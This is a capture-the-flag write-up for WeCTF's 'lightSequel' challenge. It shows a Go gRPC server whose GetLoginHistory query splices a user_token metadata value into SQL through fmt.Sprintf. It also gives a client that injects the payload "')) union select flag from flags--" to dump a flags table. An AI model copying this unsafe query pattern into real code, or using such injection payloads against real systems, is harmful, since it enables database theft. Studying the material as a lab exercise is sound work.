
##
#
https://ctftime.org/writeup/21526
#
##

lightSequel
by freeeve / The Additional Payphones
Tags: sqli golang 

Rating:

This was a nice opportunity to see grpc in action.

They provided the code for the server, as well as the protobuf-based service.

full code here

Looking at the code, I saw a possible sql injection vulnerability here (in the where clause):

```
func (s *srvServer) GetLoginHistory(ctx context.Context, _ *pb.SrvRequest) (*pb.SrvReply, error) {
  md, _ := metadata.FromIncomingContext(ctx)
  if len(md["user_token"]) == 0 {
    // no user token provided by upstream
    return &pb.SrvReply{
      Ip: nil,
        }, nil
  }
  userToken := md["user_token"][0]
  var ul []UserLogs
  err := db.Table("user_logs AS ul").
    Select("ul.ip").
    Where(fmt.Sprintf("ul.user_id = (SELECT id FROM users AS u WHERE u.token = '%s')", userToken)).
    Find(&ul)
  if err != nil {
    log.Println(err)
  }
  // convert struct to an array
  var ips []string
  for _, v := range ul {
    ips = append(ips, v.Ip)
  }
  return &pb.SrvReply{
    Ip: ips,
  }, nil
}

```

First step: implement a client to be able to call the GetLoginHistory. I went through the steps of invoking the AuthSrv and registering, but it turns out that wasn’t actually needed–the GetLoginHistory is only checking the token exists, without validation.

```
func main() {
  conn, err := grpc.Dial("light.w-va.cf:1004", grpc.WithInsecure())
  if err != nil {
    panic(err)
  }
  defer conn.Close()
  srvc := proto.NewSrvClient(conn)
  srvreq := proto.SrvRequest{}
  srvresp, err := srvc.GetLoginHistory(context.Background(), &srvreq)
  if err != nil {
    panic(err)
  }
  fmt.Println(srvresp)
}
```

This got the nil response. It took me a bit more effort to figure out how to pass a user_token into the md via the metadata.FromIncomingContext(ctx). And from there, a union-based sql injection to get the flag.
```
  srvc := proto.NewSrvClient(conn)
  md := metadata.New(map[string]string{"user_token": "')) union select flag from flags--"})
  ctx := metadata.NewOutgoingContext(context.Background(), md)
  srvreq := proto.SrvRequest{}
  srvresp, err := srvc.GetLoginHistory(ctx, &srvreq)
  ```
  
It was cool to learn about grpc and xorm as well–haven’t done serious golang in a while. Thanks wectf. :)

Original writeup (https://freeeve.github.io/ctf-writeups/posts/2020/wectf/light-sequel/).
